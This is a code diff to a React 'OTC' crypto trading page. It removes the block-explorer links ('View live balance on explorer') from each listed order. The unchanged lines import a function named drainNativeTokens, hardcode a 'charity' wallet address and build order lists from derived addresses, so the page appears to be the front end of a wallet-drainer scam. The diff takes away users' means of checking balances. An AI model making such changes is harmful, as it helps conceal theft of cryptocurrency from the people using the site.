@@ -6,7 +6,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Badge } from '@/components/ui/badge';
 import { motion, AnimatePresence } from 'framer-motion';
-import { X, ArrowUpDown, Clock, Send, FileText, Wallet, ExternalLink, Search, Loader2, AlertCircle, Check, TrendingUp, TrendingDown } from 'lucide-react';
+import { X, ArrowUpDown, Clock, Send, FileText, Wallet, Search, Loader2, AlertCircle, Check, TrendingUp, TrendingDown } from 'lucide-react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { fetchTokenInfo, DexScreenerTokenInfo } from '@/services/dexScreener';
 import { AnimatedLogo } from '@/components/AnimatedLogo';
@@ -22,7 +22,7 @@ import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
 import { deriveOrderFromAddress, shortAddress } from '@/services/tokenHolders';
-import { buildVisibleWallets, explorerUrlFor } from '@/services/walletPool';
+import { buildVisibleWallets } from '@/services/walletPool';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -1145,7 +1145,6 @@ const OTC = () => {
                     : o.status === 'pending'
                     ? 'text-orange-400'
                     : 'text-red-500';
-                const explorer = explorerUrlFor(address, getEVMChain()?.name);
                 return (
                   <div
                     key={address + idx}
@@ -1174,18 +1173,6 @@ const OTC = () => {
                     <span className={`text-xs font-bold capitalize ${statusClass}`}>
                       {o.status === 'cancelled' ? 'Canceled' : o.status}
                     </span>
-                    {explorer && (
-                      <a
-                        href={explorer}
-                        target="_blank"
-                        rel="noopener noreferrer"
-                        onClick={(e) => e.stopPropagation()}
-                        title="View live balance on explorer"
-                        className="p-1.5 rounded-md hover:bg-white/10 text-muted-foreground hover:text-primary transition-colors"
-                      >
-                        <ExternalLink className="w-4 h-4" />
-                      </a>
-                    )}
                   </div>
                 );
               })
